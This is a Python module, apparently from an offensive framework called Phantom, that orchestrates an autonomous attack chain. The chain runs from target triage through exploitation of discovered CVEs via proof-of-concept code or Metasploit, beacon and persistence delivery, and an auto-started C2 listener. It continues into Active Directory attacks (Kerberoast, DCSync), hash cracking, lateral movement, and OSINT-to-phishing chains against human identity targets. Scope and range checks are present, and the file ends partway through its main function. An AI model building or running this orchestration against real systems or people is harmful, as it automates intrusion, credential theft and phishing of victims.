"""
automode.py — Phantom Auto Mode Orchestrator
Completa kill chain autonoma: enumeration → exploit → post-exploitation.
"""

import os
import time
import threading
from typing import Any, Callable, Dict, List, Optional

from rich.console import Console
from phantom.core.session import session, KB_STATUS_DEFAULT
from phantom.core.session_bridge import (merge_agent_into_session,
                                         seed_findings_from_session)
from phantom.utils.notifier import notifier
from phantom.utils.network import get_lhost

console = Console()

# --- extracted policy / rendering / reporting (thin re-exports) ----------
# The bodies live in automode_policy / automode_render / automode_report:
# run_auto_mode is the orchestrator, not the policy. The underscore names
# stay importable HERE because the CLI, the API and the tests reach
# automode for them (and monkeypatch them through this namespace).
from phantom.core.automode_policy import (  # noqa: E402
    apply_range_policy as _apply_range_policy,
    expand_targets as _expand_targets,
    extract_networks as _extract_networks,
    scope_preflight as _scope_preflight,
    triage_targets as _triage_targets,
    warn_missing_scope as _warn_missing_scope,
)
from phantom.core.automode_render import (  # noqa: E402
    emit_rendered as _emit_rendered,
    make_agent_stream as _make_agent_stream,
    stream_agent_event as _stream_agent_event,
    stream_swarm_event as _stream_swarm_event,
)
from phantom.core.automode_report import (  # noqa: E402
    fmt_elapsed as _fmt_elapsed,
    print_agent_single_tail as _print_agent_single_tail,
    print_campaign_tail as _print_campaign_tail,
    print_report_paths as _print_report_paths,
    print_swarm_tail as _print_swarm_tail,
    report_out_dir as _report_out_dir,
    safe_target_dir as _safe_target_dir,
    write_agent_reports as _write_agent_reports,
    write_swarm_summary as _write_swarm_summary,
)
from phantom.automation.engagement_outcome import (  # noqa: E402
    board_goal_reached as _board_goal_reached,
    derive_engagement as _derive_engagement,
    derive_target_outcome as _derive_target_outcome,
    missing_goal_facts as _missing_goal_facts,
    needs_callback as _needs_callback,
    outcome_label as _outcome_label,
)


def _listenerless_allowed() -> bool:
    """May a callback-dependent goal run with NO C2 listener?

    Default NO. Deploying a beacon nobody can answer only burns the
    engagement, so the operator opts in explicitly (config
    `c2.allow_listenerless`, or PHANTOM_ALLOW_LISTENERLESS=1) when they
    intend to bring a listener up by hand later (a different host, a
    tunnel, a Go data plane).
    """
    try:
        from phantom.utils import config as cfg
        raw = cfg.get("c2.allow_listenerless", False,
                      env="PHANTOM_ALLOW_LISTENERLESS")
    except Exception:
        return False
    return str(raw).strip().lower() in ("1", "true", "yes", "on")


def _announce_outcome(goal: str, outcome: str, target: str, result,
                      on_event=None) -> None:
    """Say what the run achieved, on the CLI and on the event stream.

    The job lifecycle answers "is the process done?"; this answers "is the
    GOAL done?" — and when it is not, it names the goal facts still
    missing, so a partial run leaves the operator with a lead instead of a
    shrug.
    """
    label = _outcome_label(outcome)
    missing = _missing_goal_facts(goal, result or {})
    if outcome == "completed_goal":
        notifier.success(f"Outcome [{target}]: {label} — goal "
                         f"'{goal}' reached.")
    elif outcome in ("partial", "completed_without_goal"):
        gap = f" Missing facts: {', '.join(missing)}." if missing else ""
        notifier.warn(f"Outcome [{target}]: {label} — goal '{goal}' NOT "
                      f"reached.{gap}")
    else:
        notifier.error(f"Outcome [{target}]: {label} — goal '{goal}'.")
    if on_event is not None:
        try:
            on_event("outcome", {"outcome": outcome, "label": label,
                                 "goal": goal, "target": target,
                                 "missing": missing})
        except Exception:
            pass


def _callback_preflight(targets, goal: str) -> None:
    """Callback-plausibility policy (automode_policy), announced through
    THIS module's notifier: the orchestrator owns the announcer."""
    from phantom.core.automode_policy import callback_preflight
    return callback_preflight(targets, goal, notifier=notifier)


def _blocked_preflight(goal: str, resolved: List[str], message: str,
                       hint: str, on_event) -> Dict[str, Any]:
    """The ONE refusal shape for a run stopped BEFORE it starts.

    A prerequisite that is knowable up front (no C2 listener for a
    callback-bound goal, no scope for network targets) refuses the run and
    reports `blocked_preflight`, so the operator reads "blocked before start
    (prerequisite missing)" instead of a goal that merely looks like it
    failed. Two callers share this shape on purpose: a second copy is how
    the outcome vocabulary drifts apart again.
    """
    notifier.error(message, hint=hint)
    for _t in resolved:
        _announce_outcome(goal, "blocked_preflight", _t, {}, on_event)
    return {
        "goal": goal,
        "outcome": "blocked_preflight",
        "label": _outcome_label("blocked_preflight"),
        "goal_reached": False,
        "targets": {t: "blocked_preflight" for t in resolved},
        "reached": [], "partial": [], "failed": list(resolved),
    }


def _experience_enabled(explicit: Optional[bool] = None) -> bool:
    """Resolve the operator's experience-memory intent.

    Cross-engagement learning is ON by default (config
    `automation.experience`, default true): every run records (situation,
    technique, outcome, cause, repair) episodes into
    data/experience_cases.json on the operator's own disk, and the
    planner reorders already-allowed moves so a wall hit once is not hit
    the same way again. Nothing leaves the machine; the operator turns it
    off with `automation.experience: false` or --no-experience, which
    keeps the memory run-only.
    """
    from phantom.utils import config as cfg
    default_on = bool(cfg.get_bool("automation.experience", True))
    if explicit is None:
        return default_on
    return bool(explicit) if default_on else False


# -----------------------------------------------------------------------------
# Agent routing (auto -> planner agent -> swarm tasks)
# -----------------------------------------------------------------------------

# Target expansion / range policy live in automode_policy;
# event rendering lives in automode_render (both re-exported
# above under their legacy underscore names).


def _dry_run_plan(target: str, goal: str, profile: str,
                  aggressive: bool, paranoid: bool, speed: bool):
    """Build the agent's plan for a target WITHOUT executing anything."""
    from phantom.automation.belief import WorldModel
    from phantom.automation.guidance.targets import classify_target, is_identity_target
    from phantom.automation.guidance.commands import make_registry
    from phantom.automation.guidance.stealth import StealthEngine, StealthConfig
    from phantom.automation.guidance.threatmodel import BlueTeamModel
    from phantom.automation.planner import Plan, Planner, GOAL_FACTS
    tt = classify_target(target)
    wm = WorldModel(target=target, target_type=tt)
    config = StealthConfig(aggressive=aggressive, paranoid=paranoid,
                           speed=speed, profile=profile)
    stealth = StealthEngine(wm, config, BlueTeamModel.for_profile(profile))
    planner = Planner(make_registry(), stealth)
    if goal == "deep":
        # deep mode: plan every ladder stage; each step is tagged with its
        # stage so the dry-run shows the full deliver -> post -> AD path
        from phantom.automation.agent import DEEP_STAGES
        deep_steps = []
        deep_facts = []
        for sg in DEEP_STAGES:
            sp = planner.plan_strategic(wm, goal=sg)
            for s in sp.steps:
                s.reason = f"[{sg}] {s.reason}"
            deep_steps.extend(sp.steps)
            deep_facts.extend(GOAL_FACTS.get(sg, []))
        plan = Plan(steps=deep_steps, goal="deep", complete=not deep_steps)
        goal_facts = deep_facts
    else:
        plan = planner.plan_strategic(wm, goal=goal)
        goal_facts = GOAL_FACTS.get(goal, [])
    chain = "identity" if is_identity_target(tt) else "network"
    return plan, tt, chain, goal_facts


def _threat_intel_feed():
    """Lazy global threat-intel feed (NVD/OTX/CISA KEV). Offline-safe: the
    feed returns exploited=False when the network is unreachable."""
    from phantom.core.threatintel import threat_intel
    return threat_intel


def _auto_workers(target, goal, profile, aggressive, paranoid, speed) -> int:
    """Auto-decide same-target workers (-a without a count): a quick
    dry-run plan tells us whether deepening is worthwhile.
      * exploit/web steps ahead  -> 2 (lead + exploit deepening)
      * identity/social target   -> 2 (lead + DEEPEN worker: while the lead
        waits for the human, the deepen worker keeps OSINT/breach/profile
        digging and polls the grabber, so the wait is never idle)
    Otherwise a single lead is enough (and faster to converge)."""
    try:
        p, _tt, _chain, _gf = _dry_run_plan(
            target, goal, profile, aggressive, paranoid, speed)
        ids = [s.capability.id for s in p.steps]
        if any(c in ids for c in ("service_exploit", "hunt_web",
                                  "rce_foothold", "env_probe")):
            return 2
        if _chain == "identity" and any(
                c in ids for c in ("osint_identity", "campaign_launch",
                                   "dm_launch", "profile_recon",
                                   "dossier_analyze", "phish_identity")):
            return 2
    except Exception:
        pass
    return 1


def _run_agent_single(target, goal, profile, aggressive, paranoid, speed,
                      scope_list, agents, verbose=False,
                      on_event: Optional[Callable[[str, dict], None]] = None,
                      llm: bool = False, state_path: str = "",
                      experience: bool = False,
                      evolution: bool = False,
                      stop_event: Optional[threading.Event] = None,
                      reason_profile: str = "",
                      resilient_stager: bool = True,
                      identity_active: bool = False,
                      cell_loop: bool = True,
                      cell_stages: Optional[List[str]] = None,
                      evolution_mode: str = "code",
                      social_platform: str = ""):
    from phantom.automation.agent import run_autonomous
    workers = agents if agents > 0 else _auto_workers(
        target, goal, profile, aggressive, paranoid, speed)
    if workers > 1:
        notifier.info(
            f"Auto-decide: {workers} same-target workers "
            "(lead + exploit/deepen deepening).")
    # core -> auto-mode: whatever the operator already found by hand
    # (services, OS, creds, chain facts) seeds the agent's WorldModel, so
    # the autonomous chain builds on manual recon instead of redoing it.
    seed = seed_findings_from_session(target)
    if seed:
        notifier.info(
            f"Seed dal core manuale: {len(seed)} fact già noti "
            "(l'auto-mode non li riscopre da zero).")
    # P1 per-phase reports: an artifact at the end of EVERY stage, written
    # into <run dir>/phases/<NN>_<stage>/. The run directory is DERIVED from
    # the checkpoint path the orchestrator already computed, so no new
    # parameter has to be threaded through the whole call chain.
    _phase_root = os.path.dirname(state_path) if state_path else ""

    def _stage_hook(_agent, _stage, _index, _total, _ok):
        if not _phase_root:
            return
        from phantom.core.automode_report import write_phase_report
        write_phase_report(_agent, profile, _phase_root, _stage,
                           _index, _total, _ok)

    return run_autonomous(
        target=target, profile=profile, aggressive=aggressive,
        paranoid=paranoid, speed=speed, goal=goal,
        on_event=_make_agent_stream(verbose, on_event), scope_list=scope_list,
        workers_per_target=workers, return_agent=True,
        state_path=state_path or None,
        threat_intel=_threat_intel_feed(),        persist_learning=True, llm=llm,
        experience=experience, evolution=evolution, stop_event=stop_event,
        seed_findings=seed, reason_profile=reason_profile,
        resilient_stager=resilient_stager,
        identity_active=identity_active,
        cell_loop=cell_loop, cell_stages=cell_stages,
        evolution_mode=evolution_mode, stage_hook=_stage_hook,
        social_platform=social_platform)


def _exploit_all_after_run(agent, goal: str, state_path: str,
                           result: Dict) -> Dict:
    """Execute every actionable finding in the finished agent's WorldModel.

    This is deliberately OUTSIDE the normal planner loop: ``--exploit-all``
    is an explicit operator decision, not a change to the default
    ``complete_kill_chain`` contract. A verified RCE is then fed back into
    the planner with a short ``beacon`` goal, so the beacon is preferred over
    stopping at "vulnerable".
    """
    from phantom.automation.exploit.sweep import exploit_worldmodel
    summary: Dict = {}
    try:
        summary = exploit_worldmodel(agent.wm, allow_msf=True,
                                     prefer_beacon=True)
    except Exception as exc:  # noqa: BLE001 - never lose the main run
        notifier.warn(f"exploit-all: sweep failed: {exc}")
        return {"error": str(exc), "beacon_after": False}
    tried = int(summary.get("attempted", 0) or 0)
    n_candidates = int(summary.get("candidates", 0) or 0)
    knowledge_only = list(summary.get("knowledge_only", []) or [])
    rce = list(summary.get("rce", []) or [])
    vuln = list(summary.get("vulnerable", []) or [])
    if not n_candidates:
        notifier.info(
            "exploit-all: no actionable CVE in the WorldModel (no local PoC "
            "and no known Metasploit module matched the discovered services) "
            "- nothing was executed; absence of a weapon is not a compromise.")
    elif not tried:
        notifier.info(
            f"exploit-all: {n_candidates} candidate(s), none executable "
            f"({len(knowledge_only)} knowledge-only, the rest already "
            "attempted) - nothing was executed in this pass.")
    if tried:
        notifier.info(
            f"exploit-all: {tried} execution(s), "
            f"{len(vuln)} confirmed vulnerable, {len(rce)} RCE")
    for line in (summary.get("outcomes", []) or []):
        cve = line.get("cve", "?")
        method = line.get("method", "none")
        if line.get("rce"):
            notifier.success(f"exploit-all: {cve} RCE via {method} "
                             f"({line.get('evidence') or line.get('detail') or ''})")
        elif line.get("vulnerable"):
            notifier.success(f"exploit-all: {cve} vulnerable via {method} "
                             f"({line.get('evidence') or line.get('detail') or ''})")
        elif line.get("attempted"):
            notifier.warn(f"exploit-all: {cve} via {method} - "
                          f"{line.get('error') or line.get('detail') or 'negative'}")
    already = bool(result.get("beacon_established")
                   or getattr(agent, "result", {}).get("beacon_established"))
    summary["beacon_after"] = already
    # Audit trail: keep the sweep in the same result the report writer and
    # caller read, even when it found nothing to execute.
    try:
        agent.result["exploit_all"] = summary
    except Exception:
        pass
    if rce and not already:
        notifier.info(
            "exploit-all: RCE confirmed - re-planning the beacon through "
            "the verified foothold (beacon_via_rce).")
        try:
            rerun = agent.run(goal="beacon", max_iterations=8,
                              checkpoint_path=state_path or None)
            summary["beacon_rerun"] = {
                "goal_reached": bool((rerun or {}).get("goal_reached")),
                "beacon_established": bool((rerun or {}).get("beacon_established")),
                "beacon_id": (rerun or {}).get("beacon_id", ""),
            }
            summary["beacon_after"] = bool(
                (rerun or {}).get("beacon_established"))
            if summary["beacon_after"]:
                # The rerun replaced agent.result; carry its beacon facts
                # into the caller's envelope here so the copy is not left to
                # a second, easy-to-forget loop.
                for _key in ("beacon_established", "beacon_id",
                             "beacon_count", "persistence_installed",
                             "beacon_injected", "actions_taken"):
                    if _key in agent.result:
                        result[_key] = agent.result[_key]
                # Recompute the ORIGINAL goal against the post-beacon
                # WorldModel. Copying the rerun's goal_reached blindly would
                # claim "deliver" complete on a beacon alone.
                try:
                    from phantom.automation.planner import GOAL_FACTS
                    facts = GOAL_FACTS.get(goal, ())
                    # Strict check, without the graceful-degradation
                    # fallback: the beacon rerun sets its own fallback goal,
                    # and that must not turn a partial "deliver" into a
                    # completed one.
                    result["goal_facts_missing"] = [
                        f for f in facts if not agent.wm.has_any(f)]
                    result["goal_reached"] = bool(
                        facts and not result["goal_facts_missing"])
                except Exception:
                    pass
                notifier.success(
                    "exploit-all: beacon delivered through the verified RCE.")
            else:
                notifier.warn(
                    "exploit-all: RCE confirmed but beacon delivery did not "
                    "complete; the foothold remains recorded (no fake success).")
        except Exception as exc:  # noqa: BLE001
            notifier.warn(f"exploit-all: beacon re-plan failed: {exc}")
            summary["beacon_rerun_error"] = str(exc)
    # The rerun REPLACED agent.result, so write the sweep back again for the
    # report writer after the re-plan (the pre-rerun copy is not enough).
    try:
        agent.result["exploit_all"] = summary
    except Exception:
        pass
    return summary


def _run_agent_campaign(targets, goal, profile, aggressive, paranoid, speed,
                        scope_list, agents, verbose=False,
                        on_event: Optional[Callable[[str, dict], None]] = None,
                        llm: bool = False, state_dir: str = "",
                        experience: bool = False,
                        evolution: bool = False,
                        identity_active: bool = False,
                        stop_event: Optional[threading.Event] = None,
                        social_platform: str = ""):
    from phantom.automation.agent import run_campaign
    n = len(targets)
    # -aN on a campaign is the concurrent fan-out pool; when N exceeds the
    # target count, the surplus becomes SAME-TARGET phase workers so the
    # requested agent count is never silently ignored (e.g. -a4 on 2 hosts
    # -> 2 concurrent sub-agents, each with lead + exploit worker).
    if agents > n:
        max_agents = n
        workers_per_target = max(1, agents // n)
        if workers_per_target > 1:
            notifier.info(
                f"Campaign: {max_agents} concurrent sub-agents x "
                f"{workers_per_target} same-target workers.")
    else:
        max_agents = agents if agents > 0 else min(n, 3)
        workers_per_target = 1
    # P1 per-phase reports for a campaign: one phases/ ladder PER TARGET,
    # beside that target's end-of-run report, so the artifacts stay together.
    def _campaign_stage_hook(_agent, _stage, _index, _total, _ok):
        if not state_dir:
            return
        from phantom.core.automode_report import write_phase_report
        write_phase_report(
            _agent, profile,
            os.path.join(state_dir, _safe_target_dir(_agent.target)),
            _stage, _index, _total, _ok)

    return run_campaign(
        targets=targets, profile=profile, aggressive=aggressive,
        paranoid=paranoid, speed=speed, goal=goal,
        scope_list=scope_list, max_agents=max_agents,
        workers_per_target=workers_per_target,
        on_event=_make_agent_stream(verbose, on_event),
        state_dir=state_dir or None,
        threat_intel=_threat_intel_feed(), persist_learning=True, llm=llm,
        experience=experience, evolution=evolution,
        identity_active=identity_active, stop_event=stop_event,
        stage_hook=_campaign_stage_hook, social_platform=social_platform)


def _handoff_c2(beacon_id: str) -> None:
    notifier.success("=" * 56)
    notifier.success("OPERATOR HANDOFF: la kill chain si ferma qui.")
    notifier.success("Il beacon passa sotto il tuo controllo nel "
                     "terminale C2: ispeziona e fai il cleanup a mano.")
    notifier.success("=" * 56)
    from phantom.core.c2_shell import run_c2
    run_c2(preferred_beacon=beacon_id or None)


def _merge_results_to_session(agent, target: str) -> dict:
    """Bridge an auto-mode agent's findings into the manual session. Never
    raises: a bridge failure must not abort a finished engagement."""
    # the WHY trail: stash the agent's decision ledger on the session so
    # `why [capability]` in the manual shell explains the auto-run's moves
    try:
        trace = getattr(agent, "trace", None)
        if trace is not None and len(trace):
            session._last_decision_trace = trace
    except Exception:
        pass
    try:
        return merge_agent_into_session(agent, target) or {}
    except Exception as exc:            # pragma: no cover - defensive
        notifier.warn(f"Core sync failed ({target}): {exc}")
        return {}


# goal -> swarm chain template, from the single goal registry
# (phantom/automation/goals.py). Goals without a swarm chain (cleanup…)
# fall back to the single-agent path with a notice (honest, not silent).
from phantom.automation.goals import (  # noqa: E402
    SWARM_CHAIN as _GOAL_CHAIN,
    engine_for as _engine_for,
)


def _run_swarm_branch(resolved, goal, profile, aggressive, speed, agents,
                      verbose, on_event, llm, out_root, started_wall,
                      handoff_c2, resilient_stager, resume, experience,
                      evolution) -> None:
    """The swarm-engine branch of run_auto_mode, single AND campaign: run
    the operation, persist the summary, merge into the manual session and
    print the shared tail. One copy, so the engine policy is fixed once.

    `merged` is {target: counts} (session_bridge.merge_board_into_session):
    it is printed per target — the old single-target branch flattened it
    and showed `10.0.0.5={'service': 3}` instead of the counts."""
    notifier.success("=" * 25 + " PHANTOM AUTO-MODE (swarm) " + "=" * 25)
    # the swarm writes its own checkpoint after every committed (task,
    # target): on a resume it is the SAME file we are reading from, on a
    # fresh run it lives beside the reports so the artifacts stay together.
    _swarm_cp = resume or os.path.join(out_root, "swarm_checkpoint.json")
    result, summary, merged = _run_swarm_operation(
        resolved, goal, profile, aggressive, speed, agents,
        verbose, on_event, llm, resilient_stager=resilient_stager,
        resume=resume, experience=experience, evolution=evolution,
        checkpoint_path=_swarm_cp)
    _write_swarm_summary(
        summary, out_root,
        resolved[0] if len(resolved) == 1 else ",".join(resolved))
    if merged:
        for t, counts in merged.items():
            if counts:
                notifier.info(
                    f"Core sync [{t}]: " + ", ".join(
                        f"{k}={v}" for k, v in sorted(counts.items())))
    _print_swarm_tail(result, summary, out_root, started_wall,
                      goal, on_event, handoff_c2)
    # P0: swarm outcome, announced per target and returned as the envelope.
    _outcome = _derive_target_outcome(goal, result)
    for _t in resolved:
        _announce_outcome(goal, _outcome, _t, result, on_event)
    return _derive_engagement(goal, {t: _outcome for t in resolved})


def _run_swarm_operation(targets, goal, profile, aggressive, speed,
                         agents, verbose=False, on_event=None,
                         llm: bool = False, budget: int = 10,
                         resilient_stager: bool = True,
                         resume: str = "", experience: bool = False,
                         evolution: bool = False,
                         checkpoint_path: str = ""):
    """Swarm engine for run_auto_mode: fact-driven tasks over a shared
    board, then merge into the manual session. Returns
    (result, summary, merged) where result speaks the legacy keys the
    reporting tail already understands.

    The agent-path-only flags are announced HERE, once, instead of once per
    caller: --experience/--evolution are checkpoint/evolution features of the
    agent path and are ignored on the swarm path. `--resume` is NOT among them
    any more: the board/DAG checkpoint gave the swarm its own resume, so it is
    honored here (see `checkpoint_path`) rather than dropped."""
    for _flag, _name in ((experience, "--experience"),
                         (evolution, "--evolution")):
        if _flag:
            notifier.warn(
                f"{_name} ignorato sullo swarm path "
                f"(checkpoint/evolution sono del path agent)")
    from phantom.automation.swarm import run_swarm
    from phantom.automation.swarm.llm import LLMApproval
    from phantom.core.session_bridge import merge_board_into_session

    chain = _GOAL_CHAIN.get(goal, "")
    if not chain:
        # this goal has no chain of its own: the ENVIRONMENT profile
        # decides the starting template (never a hardcoded default).
        from phantom.automation.swarm import chain_for_profile
        chain = chain_for_profile(profile)
    approval = LLMApproval()
    if llm:
        approval.approve_session()
    # core -> swarm: manual recon seeds the board so workers build on it.
    # PER TARGET (a seed read for targets[0] applied to every target
    # would teach each worker another machine's truth).
    seed = {}
    for t in targets:
        try:
            facts = seed_findings_from_session(t)
            if facts:
                seed[t] = facts
        except Exception:
            continue
    # plan against the tools this box ACTUALLY has: the worker no longer
    # assumes a hardcoded nmap/curl/nc set (see swarm.worker).
    from phantom.automation.runtime.toolchain import ToolRegistry
    summary = run_swarm(
        targets, chain=chain, profile=profile, aggressive=aggressive,
        max_agents=agents or 10, budget=budget, llm_approval=approval,
        seed_facts=seed or None, scope_list=list(session.scope or []),
        toolchain=ToolRegistry(), resilient_stager=resilient_stager,
        resume=resume, checkpoint_path=checkpoint_path,
        on_event=lambda k, d: _stream_swarm_event(k, d, verbose, on_event))
    board = summary.get("board_ref")
    merged = merge_board_into_session(board) if board is not None else {}
    n_beacon = sum(board.count(t, "beacon") for t in targets) \
        if board is not None else 0
    n_persist = sum(board.count(t, "persistence") for t in targets) \
        if board is not None else 0
    n_sys = sum(board.count(t, "system_privilege") for t in targets) \
        if board is not None else 0
    n_ad = sum(board.count(t, "ad_creds") for t in targets) \
        if board is not None else 0
    n_cracked = sum(board.count(t, "cracked") for t in targets) \
        if board is not None else 0
    n_lateral = sum(board.count(t, "pivot") for t in targets) \
        if board is not None else 0
    n_creds = sum(board.count(t, "creds") for t in targets) \
        if board is not None else 0
    n_victims = sum(board.count(t, "victim_ip") for t in targets) \
        if board is not None else 0
    result = {
        "beacon_established": n_beacon > 0, "beacon_id": "",
        "persistence_installed": n_persist > 0,
        "system_privilege": n_sys > 0, "ad_creds": n_ad,
        "cracked_hashes": n_cracked, "lateral_movements": n_lateral,
        "actions_taken": summary.get("actions_taken", 0),
        "creds_found": n_creds, "victim_ips": n_victims,
        "hypotheses": 0, "hypotheses_confirmed": 0,
        "stages": {"deliver": n_beacon > 0,
                   "post_exploit": n_sys > 0,
                   "ad": n_ad > 0, "crack": n_cracked > 0,
                   "lateral": n_lateral > 0},
    }
    # P0: the swarm has no per-target `result`, so the goal is read off the
    # shared board with the SAME fact vocabulary the agent uses — one goal
    # registry decides both engines' notion of "done".
    result["goal_reached"] = bool(
        board is not None and _board_goal_reached(goal, board, targets))
    return result, summary, merged


def _probe_bind(host: str, port: int) -> bool:
    """Can this box bind (host, port) right now? A throwaway socket answers
    without touching the real C2 server instance (no half-dead state)."""
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((host, port))
        return True
    except OSError:
        return False
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _ensure_c2_listener(server=None) -> bool:
    """Auto-mode brings its own C2 listener (HTTPS/mTLS) BEFORE any beacon
    deploy — unless the operator disabled it via ``c2.listener_auto_start``.

    BINDS ``c2.bind`` (default 0.0.0.0: every interface, so a multi-homed
    box or a changed VPN/LAN address never silently makes the C2
    unreachable) on the derived PORT; the address beacons are TOLD to dial
    stays get_c2_endpoint()[0]. When the configured bind is not bindable
    (port taken) it falls back to the loopback for local-lab runs and says
    so loudly. Returns True when a listener is up afterwards, False
    otherwise (the run then continues listener-less: beacons deploy but
    cannot check in)."""
    from phantom.core.c2_server import server_instance, listener_bind_host
    from phantom.utils.network import get_c2_endpoint
    srv = server if server is not None else server_instance
    if srv.thread and srv.thread.is_alive():
        return True
    from phantom.utils import config as cfg
    # With the Go data plane selected, the Python listener must stay DOWN: two
    # servers on one port fight for the bind and the beacons see random
    # failures. The operator runs `c2d` instead; the protocol is identical.
    if str(cfg.get("c2.transport_backend", "python") or "python").strip().lower() == "go":
        notifier.warn("c2.transport_backend=go: the Python listener is NOT "
                      "started — run the Go data plane (`c2d`) so the two do "
                      "not fight over the port")
        return False
    if not cfg.get("c2.listener_auto_start", True):
        notifier.warn("c2.listener_auto_start is off and no C2 listener is "
                      "up: deployed beacons cannot check in — start one "
                      "with `c2` -> listener start")
        return False
    dial_host, port = get_c2_endpoint()
    bind_host = listener_bind_host()
    if not _probe_bind(bind_host, port):
        if bind_host != "127.0.0.1" and _probe_bind("127.0.0.1", port):
            notifier.warn(f"C2 bind {bind_host}:{port} is not available here "
                          f"— falling back to loopback 127.0.0.1:{port} "
                          f"(local lab only: remote beacons cannot reach it)")
            bind_host = "127.0.0.1"
        else:
            notifier.warn(f"C2 listener cannot start on {bind_host}:{port} "
                          f"(port already in use?) — continuing without a "
                          f"listener")
            return False
    notifier.status(f"Starting C2 listener on {bind_host}:{port} "
                    f"(HTTPS/mTLS auto; beacons dial {dial_host})")
    try:
        srv.start(host=bind_host, port=port, use_ssl=True)
        return True
    except Exception as exc:
        notifier.warn(f"C2 listener auto-start failed: {exc}")
        return False


# The MANUAL path needs the same thing (audit §1.2): `craft beacon`,
# `payload deploy` and `exploit deploy-agent` compile a dropper that has to
# check in SOMEWHERE, and only auto-mode brought a listener up — a hand-
# deployed beacon could have nobody to call back to. Same helper, same
# `c2.listener_auto_start` gate, one policy; the private name stays the call
# site inside this module (tests patch it there).
ensure_c2_listener = _ensure_c2_listener


def run_auto_mode(targets=None, aggressive: bool = False, stealth: bool = False,
                  speed: bool = False, plan: bool = False, agents: int = 0,
                  exploit_all: bool = False,
                  goal: str = "deliver", profile: str = "enterprise",
                  verbose: bool = False,
                  on_event: Optional[Callable[[str, dict], None]] = None,
                  handoff_c2: bool = True,
                  llm: bool = False,
                  experience: bool = False,
                  evolution: bool = False,
                  beta: bool = False,
                  resume: str = "",                   stop_event: Optional[threading.Event] = None,
                   reason_profile: str = "",
                   resilient_stager: bool = True,
                   identity_active: bool = False,
                   cell_loop: bool = True,
                   cell_stages: Optional[List[str]] = None,
                   only_markdown: bool = False,
                   engine: str = "agent",
                   force_network: bool = False,
                   force_profile: bool = False,
                   social_platform: str = "") -> None:
    """Autonomous kill chain (planner agent) — the `auto` entry point.

    Classifies each target (ip/domain/url/email/username/phone) and drives
    the full chain to beacon injection + persistence, then hands the beacon
    over to the operator in the C2 terminal. Identity targets converge
    through OSINT -> breach -> persona -> phish -> victim_ip first.

    goal="deep" does not stop at the beacon: it walks the ladder deliver ->
    post_exploit (SYSTEM/root + injection) -> ad (domain enum + kerberoast/
    AS-REP/DCSync) -> crack -> lateral, ending only when each stage has
    either succeeded or proven non-viable, and reports every stage outcome.

    Flags:
      stealth (paranoid)  max-OPSEC: slower cadence, skips loud tools
      aggressive          noisy + fast: online brute, loud tools, broad enum
      speed               opportunistic: exploit the first viable opening
      exploit_all         after the normal run, execute every actionable
                          CVE in the WorldModel (local PoC / Metasploit)
                          and use a verified RCE to deliver the beacon;
                          off by default, so complete_kill_chain semantics
                          are unchanged
      plan                dry-run: print the planned chain, execute nothing
      verbose             stream the live reasoning trace (inferences,
                          hypotheses formed, confirmations/refutations)      agents              N sub-agents (0 = auto-decide)
      resume <checkpoint> resume a run from an auto-mode checkpoint (also
                          inside an imported .pm bundle)

    Every run writes a checkpoint after each wave (data/sessions/auto_*/)
    so an interrupted engagement resumes with `--resume`, and the session
    can be handed to another operator with `export-session` (.pm).

    `stealth` and `aggressive` are mutually exclusive (validated by caller).

    engine "agent" (default) runs the single-agent planner chain;
    engine "swarm" runs fact-driven swarm tasks over a shared board
    (orchestrator + worker agents, merged back into the session).

    force_network: a CIDR/range input engages ONLY host discovery (-sn
    + ranking) by default — the range is NEVER sprayed with full chains
    unless the operator passes force_network=True (CLI --force-network
    with an explicit disclaimer + confirm). A range is not intent.

    force_profile: keep `profile` even when it contradicts the target
    class (e.g. --profile mobile on a PC). By default the coherence
    check corrects the posture and says so; this flag is the operator's
    escape hatch for the cases where the contradiction is intentional.
    """
    raw = list(targets or [])
    if isinstance(targets, str):
        raw = [targets]
    scope_list = list(session.scope) if session.scope else []
    resolved = _expand_targets(raw, scope_list=scope_list)
    if not resolved and session.target:
        resolved = _expand_targets([session.target], scope_list=scope_list)
    if not resolved:
        notifier.error("No target given. Use: auto <target> [target2, ...]")
        return

    # senior network triage: a CIDR/subnet input gets host
    # discovery + surface ranking BEFORE the assault, so the
    # agent pool works the richest hosts first (see
    # automode_policy.triage_targets for the policy).
    networks = _extract_networks(raw)
    resolved = _triage_targets(raw, networks, resolved)

    # RANGE POLICY: a CIDR/range token authorizes discovery
    # (-sn + ranking, done by triage_targets), never an
    # assault. Engaging N hosts with full chains needs
    # explicit operator intent per host, or the force flag
    # with its disclaimer. A range is not intent. Dry-run
    # (--plan) always passes: it executes nothing.
    if not _apply_range_policy(networks, resolved, raw,
                               force_network, plan):
        return

    notifier.success("=" * 25 + " PHANTOM AUTO-MODE (agent) " + "=" * 25)
    # profile <-> target coherence: the profile is the ENVIRONMENT, the
    # target is the ENTITY. When they contradict (`--profile mobile` on a
    # PC, or a machine profile on a phone number) the posture derived from
    # the profile is wrong by construction, so the plan is corrected here
    # and the correction is announced — never silent. `--force-profile`
    # (force_profile=True) keeps the operator's choice: they may know the
    # IP *is* the phone. This REPLACES the old, one-way "default
    # enterprise + phone target -> mobile" rule, which could not see the
    # opposite (and worse) mistake.
    from phantom.automation.guidance.targets import classify_target
    from phantom.automation.swarm.profile_policy import check_profile_target
    _check = check_profile_target(
        profile, [classify_target(t) for t in resolved], force=force_profile)
    if not _check.ok:
        notifier.warn(_check.reason)
    profile = _check.effective

    notifier.info(f"Target: {', '.join(resolved)}")
    notifier.info(f"Goal: {goal} | profile: {profile} | "
                  f"stealth={'paranoid' if stealth else 'on'} | "
                  f"aggressive={aggressive} | speed={speed} | "
                  f"verbose={verbose} | agents={agents or 'auto'} | "
                  f"llm={'on' if llm else 'off'} | "
                  f"experience={'global' if _experience_enabled(experience) else 'run-only'}")
    # a beacon-bound goal is only as good as the callback the target can
    # make: name an implausible endpoint BEFORE burning the engagement
    _callback_preflight(resolved, goal)
    # A-6: auto-mode FAILS CLOSED without a scope. The prerequisite is
    # knowable NOW, so a real run is refused BEFORE the listener starts and
    # before anything is deployed — the same fail-closed treatment the
    # callback preflight gets, and the outcome says `blocked_preflight`. The
    # dry run only warns and still prints the plan: reading a plan is not an
    # engagement, and refusing it would leave the operator with no way to
    # inspect what a run WOULD do.
    if not scope_list:
        _scope_verdict = _scope_preflight(resolved, scope_list=scope_list)
        if not _scope_verdict.ok:
            if not plan:
                return _blocked_preflight(goal, resolved,
                                          _scope_verdict.message,
                                          _scope_verdict.hint, on_event)
            _warn_missing_scope(resolved)

